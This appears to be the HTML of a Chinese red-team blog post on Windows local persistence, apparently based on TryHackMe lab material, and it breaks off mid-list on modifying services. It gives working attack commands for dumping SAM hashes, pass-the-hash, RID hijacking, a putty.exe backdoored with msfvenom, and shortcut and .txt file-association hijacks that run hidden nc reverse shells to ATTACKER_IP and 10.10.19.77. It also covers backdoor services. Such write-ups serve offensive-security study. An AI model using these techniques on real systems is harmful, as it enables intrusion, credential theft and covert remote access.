@@ -1,0 +1,300 @@
+<!DOCTYPE html><html lang="zh-CN" data-astro-cid-sgg5joot><head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/png" href="/favicon.png"><link rel="icon" href="/favicon.ico" sizes="any"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="Zumpyx's Blog" href="https://blog.zumpyx.com/rss.xml"><meta name="generator" content="Astro v7.1.0"><meta name="color-scheme" content="light dark"><meta name="theme-color" content="#0b0d11" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#f4f5f7" media="(prefers-color-scheme: light)"><script>
+	(() => {
+		try {
+			const t = localStorage.getItem('theme');
+			if (t === 'light' || t === 'dark') document.documentElement.setAttribute('data-theme', t);
+			else document.documentElement.removeAttribute('data-theme');
+		} catch {}
+	})();
+</script><style>@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/89758defcfa85239.woff") format("woff");font-display:swap;font-weight:400;font-style:normal;}@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/14aa8dd5744dd4bc.woff") format("woff");font-display:swap;font-weight:700;font-style:normal;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial";src:local("Arial");font-display:swap;font-weight:400;font-style:normal;size-adjust:99.3717%;ascent-override:80.1033%;descent-override:25.2587%;line-gap-override:0%;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial Bold";src:local("Arial Bold");font-display:swap;font-weight:700;font-style:normal;size-adjust:92.2954%;ascent-override:86.2448%;descent-override:27.1953%;line-gap-override:0%;}:root{--font-atkinson:Atkinson-c7f4c4e8b285552f,"Atkinson-c7f4c4e8b285552f fallback: Arial","Atkinson-c7f4c4e8b285552f fallback: Arial Bold",sans-serif;}</style><link rel="preload" href="/_astro/fonts/89758defcfa85239.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/_astro/fonts/14aa8dd5744dd4bc.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://blog.zumpyx.com/blog/windows-local-persistence/"><!-- Primary Meta Tags --><title>Windows 本地权限维持 · Zumpyx&#39;s Blog</title><meta name="description" content="分配至 administrators 组是最直接的方法，但是太容易被发现，因此可以添加到 &quot;Backup Operators&quot; 组中，备份操作员组可以忽略 DACL 读取/写入系统上的任意文件，可以复制 SAM 和 SYSTEM，因此可以恢复所有用户的密码 Hash，轻松接管任意用户；由于非特权用户无法远程管理计算机，所以可以添加至 &quot;Remote Mana…"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://blog.zumpyx.com/blog/windows-local-persistence/"><meta property="og:title" content="Windows 本地权限维持 · Zumpyx's Blog"><meta property="og:description" content="分配至 administrators 组是最直接的方法，但是太容易被发现，因此可以添加到 &quot;Backup Operators&quot; 组中，备份操作员组可以忽略 DACL 读取/写入系统上的任意文件，可以复制 SAM 和 SYSTEM，因此可以恢复所有用户的密码 Hash，轻松接管任意用户；由于非特权用户无法远程管理计算机，所以可以添加至 &quot;Remote Mana…"><meta property="og:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><!-- Twitter --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:url" content="https://blog.zumpyx.com/blog/windows-local-persistence/"><meta name="twitter:title" content="Windows 本地权限维持 · Zumpyx's Blog"><meta name="twitter:description" content="分配至 administrators 组是最直接的方法，但是太容易被发现，因此可以添加到 &quot;Backup Operators&quot; 组中，备份操作员组可以忽略 DACL 读取/写入系统上的任意文件，可以复制 SAM 和 SYSTEM，因此可以恢复所有用户的密码 Hash，轻松接管任意用户；由于非特权用户无法远程管理计算机，所以可以添加至 &quot;Remote Mana…"><meta name="twitter:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><link rel="stylesheet" href="/_astro/Header.CMmW25g2.css"><link rel="stylesheet" href="/_astro/ArticleLayout.DA3idRZl.css"><style>.nav-link[data-astro-cid-evkijfd6]{color:var(--text-muted);font-family:var(--font-mono);letter-spacing:.04em;text-transform:uppercase;white-space:nowrap;border:1px solid #0000;border-radius:999px;justify-content:center;align-items:center;padding:.5em .95em;font-size:.78rem;font-weight:500;text-decoration:none;transition:color .18s,background .18s,border-color .18s,box-shadow .18s;display:inline-flex}.nav-link[data-astro-cid-evkijfd6]:hover{color:var(--text-bright);background:var(--surface-hover);text-decoration:none}.nav-link[data-astro-cid-evkijfd6].active{color:var(--on-accent);background:linear-gradient(135deg, var(--accent-hover), var(--accent));box-shadow:0 0 0 1px var(--border-strong), 0 6px 16px var(--accent-glow-strong);text-shadow:none;border-color:#0000;font-weight:700;text-decoration:none}
+</style><script type="module" src="/_astro/page.CTxKKjGj.js"></script></head><body data-astro-cid-sgg5joot><div class="scanline" aria-hidden="true" data-astro-cid-sgg5joot></div><header data-astro-cid-nen7h5rs><div class="bar" data-astro-cid-nen7h5rs><a class="brand" href="/" data-astro-cid-nen7h5rs><span class="logo" aria-hidden="true" data-astro-cid-nen7h5rs><img src="/_astro/head.CE6FOIKY_1SW1hc.webp" srcset="/_astro/head.CE6FOIKY_1SW1hc.webp 1x, /_astro/head.CE6FOIKY_scYzG.webp 2x" alt data-astro-cid-nen7h5rs="true" loading="lazy" decoding="async" width="64" height="64" class="logo-img"></span><span class="brand-text" data-astro-cid-nen7h5rs><span class="brand-name" data-astro-cid-nen7h5rs>Zumpyx&#39;s Blog</span></span></a><nav class="nav-pill" aria-label="Primary" data-astro-cid-nen7h5rs><div class="nav-track" data-astro-cid-nen7h5rs><a href="/" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Home</a><a href="/blog" class="nav-link active" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Blog</a><a href="/hackthebox" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>HackTheBox</a><a href="/projects" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Projects</a><a href="/about" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>About</a></div></nav><div class="actions" data-astro-cid-nen7h5rs><button type="button" class="icon-btn search-trigger" data-search-open aria-label="搜索" title="搜索 (Ctrl/⌘+K)" data-astro-cid-7yy3665x><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg></button><div class="search-root" data-search-root hidden data-astro-cid-7yy3665x><div class="search-backdrop" data-search-close data-astro-cid-7yy3665x></div><div class="search-panel" role="dialog" aria-modal="true" aria-label="全站搜索" data-astro-cid-7yy3665x><div class="search-bar" data-astro-cid-7yy3665x><svg class="search-ico" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg><input type="search" class="search-input" data-search-input placeholder="全文搜索：标题 / 正文 / 标签…" autocomplete="off" autocapitalize="off" spellcheck="false" enterkeyhint="search" data-astro-cid-7yy3665x><kbd class="search-kbd" data-search-close-hint data-astro-cid-7yy3665x>Esc</kbd></div><div class="search-meta" data-search-meta data-astro-cid-7yy3665x>输入关键词开始搜索</div><ul class="search-results" data-search-results role="listbox" aria-label="搜索结果" data-astro-cid-7yy3665x></ul></div></div><script type="module" src="/_astro/SiteSearch.astro_astro_type_script_index_0_lang.CiT4pk6n.js"></script><button type="button" class="icon-btn theme-toggle" data-theme-toggle aria-label="主题：跟随系统" title="主题：跟随系统（点击切换）" data-astro-cid-l6lhmie6><span class="icon icon-system" aria-hidden="true" data-astro-cid-l6lhmie6><!-- auto / system --><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><rect x="3" y="4" width="18" height="12" rx="2" data-astro-cid-l6lhmie6></rect><path d="M8 20h8M12 16v4" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-light" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><circle cx="12" cy="12" r="4" data-astro-cid-l6lhmie6></circle><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-dark" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><path d="M21 14.5A8.5 8.5 0 1 1 9.5 3a7 7 0 0 0 11.5 11.5z" stroke-linejoin="round" data-astro-cid-l6lhmie6></path></svg></span></button><script>
+	(() => {
+		const KEY = 'theme';
+		const ORDER = ['system', 'light', 'dark'];
+		const LABELS = {
+			system: '主题：跟随系统',
+			light: '主题：亮色',
+			dark: '主题：暗色',
+		};
+
+		const getStored = () => {
+			try {
+				const v = localStorage.getItem(KEY);
+				if (v === 'light' || v === 'dark' || v === 'system') return v;
+			} catch {}
+			return 'system';
+		};
+
+		const apply = (mode) => {
+			const root = document.documentElement;
+			if (mode === 'light' || mode === 'dark') root.setAttribute('data-theme', mode);
+			else root.removeAttribute('data-theme');
+			try {
+				if (mode === 'system') localStorage.removeItem(KEY);
+				else localStorage.setItem(KEY, mode);
+			} catch {}
+		};
+
+		const syncButton = (mode) => {
+			document.querySelectorAll('[data-theme-toggle]').forEach((btn) => {
+				btn.setAttribute('data-mode', mode);
+				btn.setAttribute('aria-label', LABELS[mode]);
+				btn.setAttribute('title', `${LABELS[mode]}（点击切换）`);
+				btn.querySelectorAll('.icon').forEach((el) => {
+					el.hidden = true;
+				});
+				const icon = btn.querySelector(`.icon-${mode}`);
+				if (icon) icon.hidden = false;
+			});
+		};
+
+		const mode = getStored();
+		apply(mode);
+		syncButton(mode);
+
+		document.querySelectorAll('[data-theme-toggle]').forEach((btn) => {
+			btn.addEventListener('click', () => {
+				const cur = getStored();
+				const next = ORDER[(ORDER.indexOf(cur) + 1) % ORDER.length];
+				apply(next);
+				syncButton(next);
+			});
+		});
+
+		// If following system, react to OS changes
+		try {
+			const mq = window.matchMedia('(prefers-color-scheme: dark)');
+			mq.addEventListener?.('change', () => {
+				if (getStored() === 'system') apply('system');
+			});
+		} catch {}
+	})();
+</script><a class="icon-btn" href="/rss.xml" target="_blank" rel="noopener noreferrer" title="RSS" aria-label="RSS 订阅" data-astro-cid-nen7h5rs><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-nen7h5rs><path d="M5 19a1.5 1.5 0 1 0 0.01 0" fill="currentColor" stroke="none" data-astro-cid-nen7h5rs></path><path d="M4 11a9 9 0 0 1 9 9" stroke-linecap="round" data-astro-cid-nen7h5rs></path><path d="M4 5a15 15 0 0 1 15 15" stroke-linecap="round" data-astro-cid-nen7h5rs></path></svg></a></div></div></header><main data-astro-cid-sgg5joot><article data-astro-cid-sgg5joot><div class="article-shell" data-astro-cid-sgg5joot><div class="prose" data-article-body data-astro-cid-sgg5joot><div class="title" data-astro-cid-sgg5joot><div class="date" data-astro-cid-sgg5joot><time datetime="2024-06-01T00:00:00.000Z">2024-06-01</time></div><div class="title-row" data-astro-cid-sgg5joot><h1 data-astro-cid-sgg5joot>Windows 本地权限维持</h1></div><div class="meta" data-astro-cid-sgg5joot><span class="badge">windows</span><span class="badge">persistence</span><span class="badge">red-team</span></div><hr data-astro-cid-sgg5joot></div><div class="content" data-article-content data-astro-cid-sgg5joot><h2 id="assign-group-memberships">Assign Group Memberships</h2>
+<p>分配用户组</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>C:\&gt; net localgroup administrators thmuser0 /add</span></span>
+<span class="line"><span>C:\&gt; net localgroup "Backup Operators" thmuser1 /add</span></span>
+<span class="line"><span>C:\&gt; net localgroup "Remote Management Users" thmuser1 /add</span></span></code></pre>
+<p>分配至 administrators 组是最直接的方法，但是太容易被发现，因此可以添加到 “Backup Operators” 组中，备份操作员组可以忽略 DACL 读取/写入系统上的任意文件，可以复制 SAM 和 SYSTEM，因此可以恢复所有用户的密码 Hash，轻松接管任意用户；由于非特权用户无法远程管理计算机，所以可以添加至 “Remote Management Users” 组获得 WinRM 管理权限，或者 “Remote Desktop Users” 获得 RDP 权限</p>
+<p>另外，由于 UAC 的存在，WinRM 连接时会失去管理权限，所以即便在 “Backups Operators” 组中也无法访问所有文件，，因此需要禁用 LocalAccountTokenFilterPolicy</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>C:\&gt; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1</span></span></code></pre>
+<p>在新的连接中可以获取用户密码 Hash 备份</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>*Evil-WinRM* PS C:\&gt; reg save hklm\system system.bak </span></span>
+<span class="line"><span>*Evil-WinRM* PS C:\&gt; reg save hklm\sam sam.bak </span></span>
+<span class="line"><span>*Evil-WinRM* PS C:\&gt; download system.bak </span></span>
+<span class="line"><span>*Evil-WinRM* PS C:\&gt; download sam.bak </span></span></code></pre>
+<p>使用 <code>secretsdump.py</code> Dump Hash</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL</span></span></code></pre>
+<p>最后 PTH 获取管理员权限</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>user@AttackBox$ evil-winrm -i MACHINE_IP -u Administrator -H [Hash]</span></span></code></pre>
+<h2 id="special-privileges-and-security-descriptors">Special Privileges and Security Descriptors</h2>
+<p>无需修改任何组成员身份即可实现与将用户添加到 Backup Operators 组类似的结果。特殊组之所以特殊，是因为操作系统默认为它们分配了特定的权限。权限只是在系统本身上执行任务的能力。它们包括简单的事情，例如能够关闭服务器的能力，以及非常特权的操作，例如能够获得系统上任何文件的所有权。</p>
+<p>首先导出配置文件</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">secedit </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">/</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">export </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">/</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">cfg config.inf</span></span></code></pre>
+<p>![[assets/Pasted image 20231116171331.png]]
+修改内容</p>
+<p>最终将 .inf 文件转化为 .sdb 文件，然后加载回系统</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">secedit </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">/</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">import </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">/</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">cfg config.inf </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">/</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">db config.sdb</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">secedit </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">/</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">configure </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">/</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">db config.sdb </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">/</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">cfg config.inf</span></span></code></pre>
+<p>现在拥有一个与备份操作员具有同等权限的用户。用户暂时无法通过WinRM登录系统。我们将更改与 WinRM 服务关联的安全描述符以允许 thmuser2 连接，而不是将用户添加到远程管理用户组。将安全描述符视为 ACL，但应用于其他系统设施。</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">Set-PSSessionConfiguration</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">Name Microsoft.PowerShell </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">-</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">showSecurityDescriptorUI</span></span></code></pre>
+<p>![[assets/Pasted image 20231116171537.png]]
+添加图中的权限
+更改 UAC 相关注册表，以在 WinRM 中可以使用特殊权限</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>C:\&gt; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1</span></span></code></pre>
+<h2 id="rid-hijacking">RID Hijacking</h2>
+<p>RID 劫持无需成为管理员即可获得管理权限，更改​​某些注册表值，使操作系统认为您是管理员。</p>
+<p>查看所有用户的 RID （sid 的最后一位）</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>C:\&gt; wmic useraccount get name,sid</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Name                SID</span></span>
+<span class="line"><span>Administrator       S-1-5-21-1966530601-3185510712-10604624-500</span></span>
+<span class="line"><span>DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503</span></span>
+<span class="line"><span>Guest               S-1-5-21-1966530601-3185510712-10604624-501</span></span>
+<span class="line"><span>thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008</span></span>
+<span class="line"><span>thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009</span></span>
+<span class="line"><span>thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010</span></span></code></pre>
+<p>其中 thmuser3 的 RID 为 1010</p>
+<p>修改 SAM 注册表（需要 SYSTEM 权限）<code>HKLM\SAM\SAM\Domains\Account\Users\</code>
+查找 1010=0x3F2 Key，修改 F 值的 0x30 位置，小端发写入管理员的 RID（500=0x01F4）F4 01
+![[assets/Pasted image 20231117102042.png]]
+这样在登录 thmuser3 时 lSASS 会将其与管理员相同的 RID 关联起来，并授予相同的权限。</p>
+<h2 id="executable-files">Executable Files</h2>
+<p>在用户桌面出现的可执行程序，说明用户经常使用 <code>C:\Program Files\PuTTY\putty.exe</code> 因此可以注入恶意 shellcode 到 exe 中，文件正常使用，但会在启动时通过额外的线程以静默方式执行恶意代码，可以通过 msf 添加</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe</span></span></code></pre>
+<h2 id="shortcut-files">Shortcut Files</h2>
+<p>劫持快捷方式
+![[assets/Pasted image 20231117103321.png]]
+先生成一个恶意程序 <code>C:\Windows\System32\backdoor.ps1</code></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">Start-Process</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">NoNewWindow </span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"c:\tools\nc64.exe"</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "-e cmd.exe ATTACKER_IP 4445"</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">C:\Windows\System32\</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">calc.exe</span></span></code></pre>
+<p>![[assets/Pasted image 20231117103353.png]]
+修改快捷方式 Target</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">powershell.exe</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">WindowStyle </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">hidden</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> C:\Windows\System32\backdoor.ps1</span></span></code></pre>
+<h2 id="hijacking-file-associations">Hijacking File Associations</h2>
+<p>除了通过可执行文件或快捷方式进行持久化之外，我们还可以劫持任何文件关联，以强制操作系统在用户打开特定文件类型时运行 shell。</p>
+<p>注册表 <code>HKLM\Software\Classes\</code> 中为每个文件类型存储一个密钥，对于 .txt 文件具有以下 ProgID
+![[assets/Pasted image 20231117105941.png]]
+可以搜索相应 ProgID 的子项（也在 <code>HKLM\Software\Classes\</code> 下），对于 txtfile 类型，可以在其中找到负责处理 .txt 的程序的引用文件。大多数 ProgID 条目在 <code>shell\open\command</code> 下都有一个子项，其中指定了对具有该扩展名的文件运行的默认命令
+![[assets/Pasted image 20231117110128.png]]
+在这种情况下，当您尝试打开 .txt 文件时，系统将执行 <code>%SystemRoot%\system32\NOTEPAD.EXE %1</code> ，其中 <code>%1</code> 表示打开的文件的名称。如果想劫持这个扩展，可以用执行后门的脚本替换命令，然后像往常一样打开文件。
+首先，我们创建一个包含以下内容的 ps1 脚本并将其保存到隐蔽位置 <code>C:\Windows\backdoor2.ps1</code> ：</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">Start-Process</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">NoNewWindow </span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"c:\tools\nc64.exe"</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "-e cmd.exe 10.10.19.77 4448"</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">C:\Windows\system32\</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">NOTEPAD.EXE</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> $args</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">[</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">0</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">]</span></span></code></pre>
+<p>然后修改注册表的执行命令
+![[assets/Pasted image 20231117110245.png]]</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">powershell.exe</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">WindowStyle </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">hidden</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> C:\Windows\System32\backdoor2.ps1 </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">%</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493">1</span></span></code></pre>
+<h2 id="creating-backdoor-services">Creating backdoor services</h2>
+<p>可以创建后门服务，以此来维持权限</p>
+<p>创建修改密码的服务</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto</span></span>
+<span class="line"><span>sc.exe start THMservice</span></span></code></pre>
+<p>也可以创建 backdoor</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe</span></span></code></pre>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto</span></span>
+<span class="line"><span>sc.exe start THMservice2</span></span></code></pre>
+<h2 id="modifying-existing-services">Modifying existing services</h2>
+<p>创建新服务很容易被发现，因此可以修改现有服务，或现有服务的可执行程序来实现</p>
+<p>获取可用服务列表</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>C:\&gt; sc.exe query state=all</span></span>
+<span class="line"><span>SERVICE_NAME: THMService1</span></span>
+<span class="line"><span>DISPLAY_NAME: THMService1</span></span>
+<span class="line"><span>        TYPE               : 10  WIN32_OWN_PROCESS</span></span>
+<span class="line"><span>        STATE              : 1  STOPPED</span></span>
+<span class="line"><span>        WIN32_EXIT_CODE    : 1077  (0x435)</span></span>
+<span class="line"><span>        SERVICE_EXIT_CODE  : 0  (0x0)</span></span>
+<span class="line"><span>        CHECKPOINT         : 0x0</span></span>
+<span class="line"><span>        WAIT_HINT          : 0x0</span></span></code></pre>
+<p>查询服务配置</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>C:\&gt; sc.exe qc THMService3</span></span>
+<span class="line"><span>[SC] QueryServiceConfig SUCCESS</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>SERVICE_NAME: THMService3</span></span>
+<span class="line"><span>        TYPE               : 10  WIN32_OWN_PROCESS</span></span>
+<span class="line"><span>        START_TYPE         : 2 AUTO_START</span></span>
+<span class="line"><span>        ERROR_CONTROL      : 1   NORMAL</span></span>
+<span class="line"><span>        BINARY_PATH_NAME   : C:\MyService\THMService.exe</span></span>
+<span class="line"><span>        LOAD_ORDER_GROUP   :</span></span>
+<span class="line"><span>        TAG                : 0</span></span>
+<span class="line"><span>        DISPLAY_NAME       : THMService3</span></span>
+<span class="line"><span>        DEPENDENCIES       : </span></span>
+<span class="line"><span>        SERVICE_START_NAME : NT AUTHORITY\Local Service</span></span></code></pre>
+<p>使用服务做权限维持时，只关心三件事</p>
+<ul>
+<li>可执行文件 （BINARY_PATH_NAME） 应指向我们的有效负载。</li>
